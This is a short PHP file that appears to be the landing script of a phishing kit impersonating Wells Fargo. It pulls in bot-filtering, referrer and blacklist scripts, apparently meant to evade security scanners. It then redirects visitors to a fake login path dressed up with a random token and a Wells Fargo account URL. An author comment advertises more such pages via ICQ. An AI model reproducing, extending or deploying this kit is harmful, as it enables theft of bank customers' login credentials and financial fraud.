<?php
/*
Please don't fuck with my code.
contact me for more page, ICQ @labdata
*/
?>

<?php
include 'bots/bot.php';
include 'bots/ref.php';
include 'bots/blacklist.php';
function genRandString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$_SESSION['randString']     = genRandString(80);

header("Location: web/login.php?web/auth/LogIn?/wells#/FargoAccounts/overview/index={$_SESSION['randString']}");
